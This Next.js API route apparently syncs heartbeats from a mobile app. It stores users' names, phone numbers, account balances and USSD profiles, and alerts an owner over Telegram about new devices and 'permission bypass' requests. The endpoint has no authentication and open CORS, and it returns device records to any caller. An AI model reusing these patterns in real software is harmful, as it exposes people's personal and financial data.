import { NextRequest, NextResponse } from 'next/server';
import { syncDeviceHeartbeat } from '@/lib/owner-store';
import {
  notifyOwnerApprovalRequest,
  notifyOwnerNewDevice,
  notifyOwnerPermissionBypassRequest,
  notifyOwnerProfileChanged,
} from '@/lib/owner-telegram';

export const dynamic = 'force-dynamic';

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, x-device-id',
  'Cache-Control': 'no-store',
};

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: CORS_HEADERS });
}

export async function POST(req: NextRequest) {
  try {
    const rawText = await req.text().catch(() => '');
    let body: Record<string, any> = {};
    if (rawText) {
      try {
        body = JSON.parse(rawText);
      } catch {
        body = {};
      }
    }
    const deviceId = String(body.deviceId || req.headers.get('x-device-id') || '').trim();
    if (!deviceId) {
      return NextResponse.json(
        { success: false, error: 'deviceId is required' },
        { status: 400, headers: CORS_HEADERS }
      );
    }

    const result = await syncDeviceHeartbeat({
      deviceId,
      deviceName: body.deviceName,
      platform: body.platform,
      appVersion: body.appVersion,
      userName: body.userName,
      phoneNumber: body.phoneNumber,
      userAccount: body.userAccount,
      balance: body.balance,
      rewardBalance: body.rewardBalance,
      appLang: body.appLang,
      isBalanceShown: body.isBalanceShown,
      isRewardShown: body.isRewardShown,
      ussdProfilesJson: body.ussdProfilesJson,
      activeUssdId: body.activeUssdId,
      phoneUssdProfilesJson: body.phoneUssdProfilesJson,
      activePhoneUssdId: body.activePhoneUssdId,
      appliedOverrideSeq: body.appliedOverrideSeq,
      offline: Boolean(body.offline),
      registerRequest: Boolean(body.registerRequest),
      freshRegistration: Boolean(body.freshRegistration),
      forceApprovalCheck: Boolean(body.forceApprovalCheck),
      checkOnly: Boolean(body.checkOnly),
      permissionBypassRequest: Boolean(body.permissionBypassRequest),
      permissionBypassCancel: Boolean(body.permissionBypassCancel),
      clientGateState: typeof body.clientGateState === 'string' ? body.clientGateState : undefined,
    });

    if (result.isNewPermissionBypassRequest) {
      await notifyOwnerPermissionBypassRequest(result.device).catch(() => {});
    }
    if (result.isNewRegistrationRequest) {
      await notifyOwnerApprovalRequest(result.device).catch(() => {});
    } else if (result.isNewDevice) {
      await notifyOwnerNewDevice(result.device).catch(() => {});
    } else if (result.profileChangedSummary) {
      await notifyOwnerProfileChanged(result.device, result.profileChangedSummary).catch(() => {});
    }

    const responsePayload =
      body.includeDevice || body.checkOnly
        ? { ...result.syncResponse, device: result.device }
        : result.syncResponse;

    return NextResponse.json(responsePayload, { headers: CORS_HEADERS });
  } catch (error: any) {
    return NextResponse.json(
      { success: false, error: error?.message || 'Device sync failed' },
      { status: 500, headers: CORS_HEADERS }
    );
  }
}
